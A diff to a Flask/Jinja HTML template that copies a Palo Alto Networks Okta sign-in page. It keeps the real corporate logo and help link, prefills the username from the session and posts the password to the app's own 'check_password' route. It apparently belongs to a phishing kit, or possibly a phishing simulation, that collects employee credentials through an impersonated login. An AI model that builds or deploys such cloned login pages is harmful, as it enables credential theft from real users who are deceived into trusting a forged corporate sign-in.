@@ -16,41 +16,70 @@
 </head>
 <body>
 <div id="signin-container">
-    <main data-se="auth-container" tabindex="-1" id="okta-sign-in" class="auth-container main-container no-beacon" style="display: block;"><div class="okta-sign-in-header auth-header"><h1><img src="https://ok4static.oktacdn.com/fs/bco/1/fs0d7cvqr2A0elyfF1t7" class="auth-org-logo" alt="Palo Alto Networks Prod logo logo" aria-label="Palo Alto Networks Prod logo logo"></h1><div data-type="beacon-container" class="beacon-container"></div></div><div class="auth-content"><div class="auth-content-inner"><div class="primary-auth"><form novalidate="novalidate" method="POST"  data-se="o-form" slot="content" id="form19" class="primary-auth-form o-form o-form-edit-mode"><div data-se="o-form-content" class="o-form-content o-form-theme clearfix"><h2 data-se="o-form-head" class="okta-form-title o-form-head">Sign In</h2><div class="o-form-error-container" data-se="o-form-error-container"></div><div class="o-form-fieldset-container" data-se="o-form-fieldset-container"><div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-5"><div data-se="o-form-label" class="okta-form-label o-form-label"><label for="okta-signin-username">Username&nbsp;</label></div><div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-username" class="o-form-input-name-username o-form-control okta-form-input-field input-fix"><input type="text" placeholder="" name="username" id="okta-signin-username" aria-label="" autocomplete="username" aria-invalid="false" aria-required="true" required=""></span></div></div><div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-30"><div data-se="o-form-label" class="okta-form-label o-form-label"><label for="okta-signin-password">Password&nbsp;</label></div><div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-password" class="o-form-input-name-password o-form-control okta-form-input-field input-fix"><input type="password" placeholder="" name="password" id="okta-signin-password" value="" aria-label="" autocomplete="current-password" aria-required="true" required=""></span>
-        {% if error %}
-        <p>
-            {{error}}
-        </p>
-        {% endif %}
-    </div>
-    </div>
-        <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-0">
-            <div data-se="o-form-input-container" class="o-form-input">
-                <span data-se="o-form-input-remember" class="o-form-input-name-remember">
-                    <div class="custom-checkbox">
-                        <input type="checkbox" name="remember" id="input42">
-                        <label for="input42" data-se-for-name="remember" class="checked">Remember me</label>
-                    </div>
-                </span>
+    <main data-se="auth-container" tabindex="-1" id="okta-sign-in" class="auth-container main-container no-beacon" style="display: block;">
+        <div class="okta-sign-in-header auth-header">
+            <h1>
+                <img src="https://ok4static.oktacdn.com/fs/bco/1/fs0d7cvqr2A0elyfF1t7" class="auth-org-logo" alt="Palo Alto Networks Prod logo logo" aria-label="Palo Alto Networks Prod logo logo">
+            </h1>
+            <div data-type="beacon-container" class="beacon-container">
             </div>
         </div>
-    </div>
-    </div>
-        <div class="o-form-button-bar">
-            <input class="button button-primary" type="submit" value="Sign In" id="okta-signin-submit" data-type="save">
-        </div>
-    </form>
-        <div class="auth-footer">
-            <a href="#" data-se="needhelp" aria-expanded="false" aria-controls="help-links-container" class="link help js-help">Need help signing in?</a>
-            <ul class="help-links js-help-links" id="help-links-container" style="display: none;">
-                <li>
-                    <a href="#" data-se="forgot-password" class="link js-forgot-password">Forgot password?</a>
-                </li>
-                <li>
-                    <a href="#" data-se="unlock" class="link js-unlock">Unlock account?</a>
-                </li>
-                <li>
-                    <a href="https://paloaltonetworks.okta.com/help/login" data-se="help-link" class="link js-help-link" rel="noopener noreferrer" target="_blank">Help</a>
+        <div class="auth-content">
+            <div class="auth-content-inner">
+                <div class="primary-auth">
+                    <form novalidate="novalidate" method="POST" action="{{url_for('check_password')}}"  data-se="o-form" slot="content" id="form19" class="primary-auth-form o-form o-form-edit-mode">
+                        <div data-se="o-form-content" class="o-form-content o-form-theme clearfix">
+                            <h2 data-se="o-form-head" class="okta-form-title o-form-head">
+                                Sign In
+                            </h2>
+                            <div class="o-form-error-container" data-se="o-form-error-container">
+                            </div>
+                            <div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
+                                <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-5">
+                                    <div data-se="o-form-label" class="okta-form-label o-form-label">
+                                        <label for="okta-signin-username">
+                                            Username&nbsp;
+                                        </label>
+                                    </div>
+                                    <div data-se="o-form-input-container" class="o-form-input">
+                                        <span data-se="o-form-input-username" class="o-form-input-name-username o-form-control okta-form-input-field input-fix">
+                                            <input type="text" placeholder="" name="username" id="okta-signin-username" aria-label="" autocomplete="username" aria-invalid="false" aria-required="true" required="" value="{{username or session['username']}}" disabled=''>
+                                        </span>
+                                    </div>
+                                </div>
+                                <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-30">
+                                    <div data-se="o-form-label" class="okta-form-label o-form-label">
+                                        <label for="okta-signin-password">
+                                            Password&nbsp;
+                                        </label>
+                                    </div>
+                                    <div data-se="o-form-input-container" class="o-form-input">
+                                        <span data-se="o-form-input-password" class="o-form-input-name-password o-form-control okta-form-input-field input-fix">
+                                            <input type="password" placeholder="" name="password" id="okta-signin-password" value="" aria-label="" autocomplete="current-password" aria-required="true" required="">
+                                        </span>
+                                        {% if error %}
+                                        <p>
+                                            {{error}}
+                                        </p>
+                                        {% endif %}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="o-form-button-bar">
+                            <input class="button button-primary" type="submit" value="Sign In" id="okta-signin-submit" data-type="save">
+                        </div>
+                    </form>
+                    <div class="auth-footer">
+                        <ul class="help-links js-help-links" id="help-links-container" style="display: none;">
+                            <li>
+                                <a href="#" data-se="forgot-password" class="link js-forgot-password">Forgot password?</a>
+                            </li>
+                            <li>
+                                <a href="#" data-se="unlock" class="link js-unlock">Unlock account?</a>
+                            </li>
+                            <li>
+                                <a href="https://paloaltonetworks.okta.com/help/login" data-se="help-link" class="link js-help-link" rel="noopener noreferrer" target="_blank">Help</a>
                 </li>
             </ul>
         </div>
